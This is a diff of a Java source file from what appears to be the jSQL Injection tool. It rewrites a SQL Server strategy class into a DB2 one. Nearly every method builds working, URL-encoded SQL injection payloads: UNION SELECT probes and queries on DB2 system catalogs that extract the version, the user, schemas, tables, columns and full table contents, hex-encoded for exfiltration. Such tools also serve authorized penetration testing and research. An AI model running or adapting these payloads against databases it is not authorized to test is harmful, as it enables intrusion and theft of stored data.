@@ -10,86 +10,50 @@ import com.jsql.model.blind.ConcreteTimeInjection;
 import com.jsql.model.injection.MediatorModel;
 import com.jsql.tool.ToolsString;
 
-public class SQLServerStrategy implements ISQLStrategy {
+public class DB2Strategy implements ISQLStrategy {
 
     @Override
     public String getSchemaInfos() {
-        return
-            "SELECT+" +
-                "CAST(N''AS+XML).value('xs:hexBinary(sql:column(\"bin\"))','VARCHAR(MAX)')%2B'i'" +
-            "FROM(" +
-                "SELECT+CAST((cast(@@version%2B'{%}'%2BDB_NAME()%2B'{%}'%2Buser%2B'{%}'%2Buser_name()AS+VARCHAR(MAX)))AS+VARBINARY(MAX))AS+bin" +
-            ")x";
+        return 
+            "select+hex(versionnumber||'{%}'||current+server||'{%}'||user||'{%}'||session_user)||'i'from+sysibm.sysversions";
     }
 
     @Override
     public String getSchemaList() {
         return
-            "SELECT+" +
-                "replace(STUFF(" +
-                    "(" +
-                        "SELECT" +
-                            "+','%2b'hh'%2Breplace(sys.fn_varbintohexstr(CAST(CAST(name+AS+VARCHAR(MAX))AS+VARBINARY(MAX))),'0x','')%2B'jj30hh'" +
-                        "FROM+" +
-                            "master..sysdatabases+" +
-                        "order+by+name+FOR+XML+PATH(''){limit}" +
-                    ")" +
-                ",1,1,'')%2B'i',',','gg')";
+            /**
+             * First substr(,3) remove 'gg' at the beginning
+             */
+            "select+substr(xmlserialize(xmlagg(xmltext('gg'||'hh'||hex(trim(schemaname))||'jj30hh'))as+varchar(1024)),3)||'i'from+syscat.schemata{limit}";
     }
 
     @Override
     public String getTableList(Database database) {
         return
-            "SELECT+" +
-                "replace(STUFF(" +
-                    "(" +
-                        "SELECT" +
-                            "+','%2b'hh'%2Breplace(sys.fn_varbintohexstr(CAST(CAST(name+AS+VARCHAR(MAX))AS+VARBINARY(MAX))),'0x','')%2B'jj30hh'" +
-                        "FROM+" +
-                            database + "..sysobjects+" +
-                        "WHERE+xtype='U'" +
-                        "order+by+name+FOR+XML+PATH(''){limit}" +
-                    ")" +
-                ",1,1,'')%2B'i',',','gg')";
+            /**
+             * First substr(,3) remove 'gg' at the beginning
+             */
+            "select+substr(xmlserialize(xmlagg(xmltext('gg'||'hh'||hex(trim(name))||'jj30hh'))as+varchar(1024)),3)||'i'from+"
+            + "(select+name+from+sysibm.systables+where+creator='"+database+"'{limit})x";
     }
 
     @Override
     public String getColumnList(Table table) {
         return
-            "SELECT+" +
-                "replace(STUFF(" +
-                    "(" +
-                        "SELECT" +
-                            "+','%2b'hh'%2Breplace(sys.fn_varbintohexstr(CAST(CAST(c.name+AS+VARCHAR(MAX))AS+VARBINARY(MAX))),'0x','')%2B'jj30hh'" +
-                        "FROM+" +
-                            table.getParent() + "..syscolumns+c," +
-                            table.getParent() + "..sysobjects+t+" +
-                        "WHERE+" +
-                            "c.id=t.id+" +
-                        "AND+t.name='" + table + "'" +
-                        "order+by+c.colorder+FOR+XML+PATH(''){limit}" +
-                    ")" +
-                ",1,1,'')%2B'i',',','gg')";
+            "select+substr(xmlserialize(xmlagg(xmltext('gg'||'hh'||hex(trim(name))||'jj30hh'))as+varchar(1024)),3)||'i'from+"
+            + "(select+name+from+sysibm.syscolumns+where+coltype!='BLOB'and+tbcreator='"+table.getParent()+"'and+tbname='"+table+"'+{limit})x";
     }
 
     @Override
     public String getValues(String[] columns, Database database, Table table) {
-        String formatListColumn = ToolsString.join(columns, "))%2bchar(127)%2bLTRIM(RTRIM(");
-        formatListColumn = "LTRIM(RTRIM(" + formatListColumn + "))";
-
+        String formatListColumn = ToolsString.join(columns, "{%}");
+        
+        formatListColumn = formatListColumn.replace("{%}", "||''))||chr(127)||trim(varchar(");
+        formatListColumn = "trim(varchar(" + formatListColumn + "||''))";
+        
         return
-            "SELECT+" +
-                "replace(STUFF(" +
-                    "(" +
-                        "SELECT" +
-                            "+','%2b'hh'%2Breplace(sys.fn_varbintohexstr(CAST(CAST(" + 
-                            formatListColumn + 
-                            "+AS+VARCHAR(MAX))AS+VARBINARY(MAX))),'0x','')%2B'jj30hh'" +
-                        "FROM+" +
-                            database + ".dbo." + table + "+" +
-                        "FOR+XML+PATH(''){limit}" +
-                    ")" +
-                ",1,1,'')%2B'i',',','gg')";
+            "select+substr(xmlserialize(xmlagg(xmltext('gg'||'hh'||r||'jj30hh'))as+varchar(1024)),3)||'i'from+"
+            + "(select+hex(" + formatListColumn + ")r+from+" + database + "." + table + "+where+1=1+{limit})x";
     }
 
     @Override
@@ -244,8 +208,15 @@ public class SQLServerStrategy implements ISQLStrategy {
 
     @Override
     public String normalStrategy(String sqlQuery, String startPosition) {
-        return 
-            "select'SQLi'%2Bsubstring((" + sqlQuery + ")," + startPosition + ",65536)";
+        return
+          "select+" +
+              /**
+               * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
+               */
+              "replace('SQLi'||substr(" +
+                  "(" + sqlQuery + ")," +
+                  startPosition +
+              "),'SQLii','SQLi')+from+sysibm.sysdummy1+";
     }
 
     @Override
@@ -270,7 +241,7 @@ public class SQLServerStrategy implements ISQLStrategy {
         return 
             MediatorModel.model().initialQuery.replaceAll(
                 "1337(" + ToolsString.join(indexes, "|") + ")7331",
-                "(select+concat('SQLi',$1,replicate(0xb8,1024),'iLQS'))"
+                "(select+'SQLi'||$1||repeat(chr(35),1024)||'iLQS')"
             );
     }
 
@@ -280,7 +251,7 @@ public class SQLServerStrategy implements ISQLStrategy {
         for (int i = 1 ; i <= nbFields ; i++) {
             fields.add("1337"+ i +"7330%2b1");
         }
-        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "--+";
+        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "+from+sysibm.sysdummy1--+";
     }
 
     @Override
@@ -290,7 +261,7 @@ public class SQLServerStrategy implements ISQLStrategy {
 
     @Override
     public String getLimit(Integer limitSQLResult) {
-        return "+offset+" + limitSQLResult + "+ROWS+FETCH+NEXT+65536+ONLY+";
+        return "+limit+" + limitSQLResult + ",5";
     }
 
 }
